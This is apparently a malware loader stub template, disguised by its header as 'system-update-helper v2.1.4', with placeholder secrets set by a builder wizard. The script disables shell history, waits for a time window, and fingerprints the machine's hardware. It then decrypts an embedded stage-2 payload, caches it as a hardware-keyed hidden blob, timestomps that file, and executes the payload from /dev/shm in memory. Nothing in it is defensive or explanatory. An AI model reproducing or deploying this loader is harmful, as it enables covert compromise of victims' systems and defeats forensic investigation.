# system-update-helper v2.1.4

# -- encoded configuration --
_secret='STUB_SECRET'
_f="STUB_BLOB_PATH"
_g='STUB_SALT'
_ws='STUB_WINDOW_START'
_we='STUB_WINDOW_END'

# configuration data
_p='STUB_S2_PAYLOAD'

# -- anti-forensic: no history --
unset HISTFILE; export HISTSIZE=0 HISTFILESIZE=0

# -- debug (compile-time, set by wizard) --
STUB_DBG_INIT

# -- time window check (handles midnight wrap) --
_tw() {
    [ -z "$_ws" ] && return 0
    _n=$(date +%H%M 2>/dev/null) || return 0
    _s=$(printf '%s' "$_ws" | tr -d ':')
    _x=$(printf '%s' "$_we" | tr -d ':')
    if [ "$_s" -le "$_x" ]; then
        [ "$_n" -ge "$_s" ] && [ "$_n" -le "$_x" ]
    else
        [ "$_n" -ge "$_s" ] || [ "$_n" -le "$_x" ]
    fi
}

# -- hardware fingerprint --
_hw() {
    _u=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null ||
         cat /sys/class/dmi/id/board_serial  2>/dev/null ||
         cat /etc/machine-id                 2>/dev/null || printf 'x')
    _i=$(ip route 2>/dev/null | awk '/default/{print $5; exit}')
    _m=$(cat "/sys/class/net/${_i}/address" 2>/dev/null ||
         ip link 2>/dev/null | awk '/ether/{print $2; exit}' ||
         printf '0')
    printf '%s%s%s' "$_u" "$_m" "$_g" | sha256sum 2>/dev/null | tr -d ' -'
}

# -- AES-256-GCM decrypt for stub_secret-encrypted payload (HIGH-2: authenticated encryption) --
_dec() {
    python3 -c "
import sys,base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
pw=sys.argv[1].encode(); blob=sys.stdin.read().strip()
if not blob.startswith('SGCM:'): sys.exit(1)
raw=base64.b64decode(blob[5:])
salt,nonce,ct=raw[:8],raw[8:20],raw[20:]
dk=PBKDF2HMAC(hashes.SHA256(),32,salt,210000).derive(pw)
sys.stdout.buffer.write(AESGCM(dk).decrypt(nonce,ct,None))
" "$1" 2>/dev/null
}
# -- AES-256-CBC encrypt/decrypt for hw-keyed local blob (unchanged) --
_enc()      { openssl enc    -aes-256-cbc -pbkdf2 -iter 210000 -md sha256 -pass "pass:${1}" -base64 -A 2>/dev/null; }
_dec_blob() { openssl enc -d -aes-256-cbc -pbkdf2 -iter 210000 -md sha256 -pass "pass:${1}" -base64 -A 2>/dev/null; }

# -- timestomp --
_ts() {
    _dir=$(dirname "$_f")
    _ref=$(ls -t "$_dir" 2>/dev/null | grep -v "^$(basename "$_f")$" | head -1)
    [ -n "$_ref" ] && touch -r "${_dir}/${_ref}" "$_f" 2>/dev/null
}

# -- execute in RAM --
_exec() {
    export STUB_PATH="$(readlink -f "$0" 2>/dev/null || echo "$0")"
    if [ -d /dev/shm ]; then
        _t=$(mktemp /dev/shm/.XXXXXXXX 2>/dev/null) || { eval "$1"; return; }
        printf '%s' "$1" > "$_t"
        chmod 700 "$_t"
        exec bash "$_t" ${_vf}
    fi
    eval "$1"
}

# ---- MAIN ----

_log "checking time window..."
while ! _tw; do sleep 300 2>/dev/null; done
_log "time window OK"

# ---- path 0: local hw-encrypted blob (ddb-first) ----
_log "checking local blob: $_f"
if [ -f "$_f" ]; then
    _log "local blob found, decrypting..."
    _k=$(_hw)
    _t=$(mktemp 2>/dev/null) || _t="/tmp/._$$"
    _dec_blob "$_k" < "$_f" > "$_t" 2>/dev/null
    if [ "$(dd if="$_t" bs=8 count=1 2>/dev/null)" = "STRATUM:" ]; then
        _log "magic prefix OK — executing local stage2"
        export _BLOB_PATH="$_f"
        _ts
        _data=$(tail -c +9 "$_t" 2>/dev/null)
        rm -f "$_t" 2>/dev/null; unset _k _t
        _exec "$_data"
        exit $?
    fi
    _log "magic prefix mismatch (hw fingerprint changed?)"
    rm -f "$_t" 2>/dev/null; unset _k _t
fi

# ---- path 1: decrypt baked payload with stub_secret ----
_log "blob miss — decrypting baked payload with stub_secret..."
_raw=$(printf '%s' "$_p" | _dec "$_secret")
case "$_raw" in
    STRATUM:*)
        _s2="${_raw#STRATUM:}"
        _log "ok ($(printf '%s' "$_s2" | wc -c) bytes)"
        unset _raw
        _log "caching hw-encrypted local blob..."
        _k=$(_hw)
        _bdir=$(dirname "$_f")
        export _BLOB_TRIED="$_f"
        mkdir -p "$_bdir" 2>/dev/null
        printf '%s' "STRATUM:${_s2}" | _enc "$_k" > "$_f" 2>/dev/null
        chmod 600 "$_f" 2>/dev/null
        export _BLOB_PATH="$_f"
        _ts
        unset _k _bdir
        _log "starting..."
        _exec "$_s2"
        exit $?
        ;;
    *)
        _log "decrypt failed"
        unset _raw
        ;;
esac

_log "no agent available — exit 1"
exit 1
